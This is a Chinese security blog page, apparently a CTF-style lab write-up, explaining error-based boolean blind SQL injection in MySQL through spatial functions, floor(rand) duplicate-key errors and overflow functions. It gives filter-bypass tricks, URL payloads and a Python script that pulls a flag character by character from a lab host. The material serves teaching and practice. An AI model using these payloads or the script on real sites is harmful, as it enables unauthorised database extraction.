@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="一种基于运行错误的Bool型盲注原理剖析前言文章首发于i春秋 老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。 靶机Docker镜像：gqleung/spatial_functions_blind_inject什么是基于运行错误的Bool型盲注？ 简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一种基于运行错误的Bool型盲注原理剖析">
+<meta property="og:url" content="https://www.plasf.cn/articles/spatial_functions_blind_inject.html">
+<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
+<meta property="og:description" content="一种基于运行错误的Bool型盲注原理剖析前言文章首发于i春秋 老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。 靶机Docker镜像：gqleung/spatial_functions_blind_inject什么是基于运行错误的Bool型盲注？ 简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210126-011441@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210126-012024@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210126-014859@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210126-020116@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210126-020240@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210126-021628@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201225-083818@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201225-093334@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201225-093851@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201225-094006@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201225-094117@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201225-094710@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210120-131144@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210120-133637@2x.png">
+<meta property="og:updated_time" content="2021-03-17T01:22:18.585Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一种基于运行错误的Bool型盲注原理剖析">
+<meta name="twitter:description" content="一种基于运行错误的Bool型盲注原理剖析前言文章首发于i春秋 老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。 靶机Docker镜像：gqleung/spatial_functions_blind_inject什么是基于运行错误的Bool型盲注？ 简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通">
+<meta name="twitter:image" content="https://goodcheerleung.gitee.io/macpic/WX20210126-011441@2x.png">
+
+<link rel="canonical" href="https://www.plasf.cn/articles/spatial_functions_blind_inject.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>一种基于运行错误的Bool型盲注原理剖析 | Xiao Leung's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?9905f6cfc84bbdd051e0d6a5e5f8714a";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Xiao Leung's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">专注网络安全研究</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/spatial_functions_blind_inject.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          一种基于运行错误的Bool型盲注原理剖析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-17 09:22:09 / 修改时间：09:22:18" itemprop="dateCreated datePublished" datetime="2021-03-17T09:22:09+08:00">2021-03-17</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="一种基于运行错误的Bool型盲注原理剖析"><a href="#一种基于运行错误的Bool型盲注原理剖析" class="headerlink" title="一种基于运行错误的Bool型盲注原理剖析"></a>一种基于运行错误的Bool型盲注原理剖析</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>文章首发于<strong>i春秋</strong></p>
+<p>老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。</p>
+<pre><code>靶机Docker镜像：gqleung/spatial_functions_blind_inject</code></pre><p>什么是<code>基于运行错误的Bool型盲注</code>？</p>
+<p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。</p>
+<h4 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a><span id="spatial">Spatial Functions</span></h4><p><code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>是两个可以从<code>文本</code>中解析Spatial function的函数，如果我们的语法各方面都复合mysql的规则，如果我们在解析文本中做手脚呢？MYSQL解释器不会检查一个字符串是否复合MYSQL语法要求，很明显这样我们就可以绕过MYSQL预检查，但是在运行时候又「恰逢其时」地出错，这样我们就可以进行Bool盲注了。需要注意的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数的。</p>
+<p>以<code>ST_GeomFromText</code>为例：</p>
+<p>例如构造如下SQL语句,很明显POINT函数传入的必须是GIS中的地理坐标的数据类型，这里写入的是一个常量或者undefined类型，但是他却能正常运行。</p>
+<pre><code class="MYSQL">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
++---------------------------------------------------+
+| IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0) |
++---------------------------------------------------+
+|                                                 0 |
++---------------------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-011441@2x.png" alt="WX20210126-011441@2x"></p>
+<p>假设我们将<code>if</code>的表达式改成<code>false</code>呢，很明显会执行中间的参数，POINT的数据类型错误会导致报错。</p>
+<pre><code class="mysql">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
+ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-012024@2x.png" alt="WX20210126-012024@2x"></p>
+<ul>
+<li>注意在Mysql5.7.6以上版本 ST_X、ST_GeomFromText已经被弃用，使用<code>ST_GeomFromText(&#39;POINT(mads)&#39;)</code>代替即可</li>
+</ul>
+<p>总结，其他可用的函数：</p>
+<pre><code class="MYSQL">SELECT IF({}, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);
+SELECT IF({}, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);
+SELECT IF({}, ST_X(MADS), 0);
+SELECT IF({}, ST_MPointFromText(&#39;MADS&#39;),0);
+SELECT IF({}, ST_GeomFromText(&#39;MADS&#39;),0);</code></pre>
+<p>我们再来看我们的靶机<code>(Docker镜像：gqleung/tmd_sz_fsl)</code></p>
+<p>经过fuzz可以发现这个靶机不论参数传递数字都是会返回同一张图，但是如果存在被ban掉的字符会返回如下图：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-014859@2x.png" alt="WX20210126-014859@2x"></p>
+<p>我们可以借此FUZZ出被ban掉的关键字：</p>
+<pre><code class="MYSQL">union、*、&#39;、&quot;、substr、mid、=、like、into、file、sleep、benchmark、 、^、or、、、、&amp;、&gt;、&lt;、#、-、ascii、ord、floor、extractvalue、updatexml、if、rp、rep、GET_LOCK、info</code></pre>
+<ul>
+<li><p>这里过滤了空格，这里可以直接用<code>\t</code>来代替空格，URL编码后是%09,在写脚本时候可以使用TAB键来代替。</p>
+</li>
+<li><p>过滤了单双引号，可以使用十六进制来代替字符串。</p>
+</li>
+<li><p>过滤了<code>if</code>可以使用<code>case when....then....else...end</code>代替</p>
+</li>
+<li><p>过滤了等于号、大于、小于、减号、like、我们可以使用正则表达式来判断也就是regexp</p>
+</li>
+</ul>
+<p>我们通过上面所讲解的<code>ST_GeomFromText</code>,结合上述过滤考点，构造如下payload,当然空格要用%09代替。</p>
+<pre><code>index.php?cat=1%09and%09IF(0,ST_X(ST_GeomFromText(0x504F494E54286D61647329)),0)</code></pre><p>如果if表达式为false可以发现返回正常的页面：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020116@2x.png" alt="WX20210126-020116@2x"></p>
+<p>若if表达式为true,那么将会返回运行错误的页面：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020240@2x.png" alt="WX20210126-020240@2x"></p>
+<p>据此编写Python脚本：</p>
+<pre><code class="PYTHON">#author：Gqleung
+#Email:  admin@plasf.cn
+#blog:   http://www.plasf.cn
+
+import requests
+
+def ord2hex(string):
+    result = &quot;&quot;
+    for i in string:
+        r = hex(ord(i));
+        r = r.replace(&#39;0x&#39;,&#39;&#39;)
+        result = result+r
+    return &#39;0x&#39;+result
+
+url = &quot;http://47.98.234.232:28076/index.php?cat=&quot;
+tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
+result=&quot;&quot;
+for i in range(1,70):
+    for j in tables:
+        if j ==&quot;{&quot; or j==&quot;}&quot;:
+            j=&#39;\\&#39;+j
+        payload = &quot;1    and    IF((select    flag    from    flag)    regexp    binary    %s,    ST_X(ST_GeomFromText(0x504F494E54286D61647329)),    0)&quot;%(ord2hex(&quot;^&quot;+result+j))
+        r = requests.get(url+payload);
+        if &#39;cat&#39; not in r.text:
+            result=result+j
+            print(result.replace(&#39;\\&#39;,&#39;&#39;))
+            break</code></pre>
+<p>运行结果：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-021628@2x.png" alt="WX20210126-021628@2x"></p>
+<h4 id="FLOOR-X"><a href="#FLOOR-X" class="headerlink" title="FLOOR(X)"></a>FLOOR(X)</h4><p>咱们先了解<a href="#floor">主键重复报错注入</a>的原理</p>
+<h4 id="主键重复报错注入"><a href="#主键重复报错注入" class="headerlink" title="主键重复报错注入"></a>主键重复报错注入</h4><h5 id="FLOOR-X-1"><a href="#FLOOR-X-1" class="headerlink" title="FLOOR(X)"></a><span id="floor">FLOOR(X)</span></h5><p>该函数返回X的最大整数值，但不能大于X，也就是向下取整。</p>
+<p>例如,下列语句5.20返回的值将会是5.</p>
+<pre><code class="mysql">select floor(5.20)</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-083818@2x.png" alt="WX20201225-083818@2x"></p>
+<p>我们先来看Payload再来分析其中的原理</p>
+<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
+<ul>
+<li>Q1为什么用<code>floor(rand(0)*2)</code>?</li>
+</ul>
+<p>要回答这个问题，必须从floor报错注入的原理理解：</p>
+<p>例如，user()中含有五条数据：</p>
+<pre><code class="mysql">select rand() from user</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093334@2x.png" alt="WX20201225-093334@2x"></p>
+<p>可以发现会随机生成小于0的随机数。当然<code>rand()*2</code>生成<code>0-1</code>的随机数</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093851@2x.png" alt="WX20201225-093851@2x"></p>
+<p>加上floor就是取整。会生成0或者1的随机值：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094006@2x.png" alt="WX20201225-094006@2x"></p>
+<p>但是为什么用rand(0)呢？</p>
+<p>Rand()两次运行的结果，可以明显地看到rand()产生的结果是随机的。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094117@2x.png" alt="WX20201225-094117@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094710@2x.png" alt="WX20201225-094710@2x"></p>
+<p>Rand(0)两次运行的结果，可以发现两次运行的结果完全一致，说明<code>rand(0)</code>是伪随机的。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
+<p>我们再来了解一下<code>group by</code> 的运作过程。</p>
+<blockquote>
+<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
+</blockquote>
+<p>例如:如下SQL语句：</p>
+<pre><code class="mysql">select id as &quot;number&quot;, contents as &quot;内容&quot; from cat group by number</code></pre>
+<p>执行该sql语句会生成一个新的虚拟表，group by 即指定虚拟表中的对应字段来作为主键。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-131144@2x.png" alt="WX20210120-131144@2x"></p>
+<p>我们知道主键只能是唯一的，如果主键出现重复的情况就会发生报错，将重复的主键输出在报错信息中，我们回过头来看报错注入的Payload.</p>
+<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
+<p>我们看到这里以x 为主键,<code>rand(0)*2</code>生成0-2之间的伪随机数，同时使用<code>floor</code>来取整，出现的只能是值为0或者1（当然前提是表所存储的记录条数要&gt;3条才有可能重复）。使用<code>concat</code>将要查询的内容拼接入主键，这样在报错时会将咱们想要的内容作为报错信息输出。</p>
+<p>例如：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-133637@2x.png" alt="WX20210120-133637@2x"></p>
+<p>注：输出字符长度限制为64个字符</p>
+<p>我们了解完FLOOR（X）报错注入原理后开始从FLOOR(X)报错注入盲注来简述其中的道理，我们直接从payload来看：</p>
+<pre><code class="mysql">select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);</code></pre>
+<p>我们知道floor(rand(0)*2)产生的随机数是伪随机数范围在0-1，如果将其参数的结果作为主键就会造成报错，假设我们用<code>if</code>语句来控制x是否作为主键呢？这就有可能造成不报错的情况，用此来作为报错注入盲注。通常情况与<a href="#spatial">Spatial Functions</a>报错注入盲注类似。</p>
+<pre><code class="mysql">mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);
+ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;
+mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(0,x,0);
++----------+---+
+| count(*) | x |
++----------+---+
+|        2 | 0 |
++----------+---+
+1 row in set (0.00 sec)</code></pre>
+<h4 id="数据溢出型"><a href="#数据溢出型" class="headerlink" title="数据溢出型"></a>数据溢出型</h4><p>在报错注入中数据溢出的函数同样可用如下。</p>
+<pre><code class="mysql">mysql&gt; select pow(2,1024);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;
+mysql&gt; select cot(0);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;
+mysql&gt; select exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre>
+<p>### </p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/articles/desctf12.html" rel="prev" title="Desctf12月月赛">
+      <i class="fa fa-chevron-left"></i> Desctf12月月赛
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一种基于运行错误的Bool型盲注原理剖析"><span class="nav-number">1.</span> <span class="nav-text">一种基于运行错误的Bool型盲注原理剖析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Spatial-Functions"><span class="nav-number">1.2.</span> <span class="nav-text">Spatial Functions</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FLOOR-X"><span class="nav-number">1.3.</span> <span class="nav-text">FLOOR(X)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主键重复报错注入"><span class="nav-number">1.4.</span> <span class="nav-text">主键重复报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FLOOR-X-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">FLOOR(X)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据溢出型"><span class="nav-number">1.5.</span> <span class="nav-text">数据溢出型</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
+      src="/header.jpg">
+  <p class="site-author-name" itemprop="name">XiaoLeung</p>
+  <div class="site-description" itemprop="description">随笔、分享、记录生活</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">69</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearのspace</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">粤ICP备18132442号-1 </a>
+      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">粤公网安备 44011202000643号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">253k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:50</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=true&web_id=true"></script>
+  </div>
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
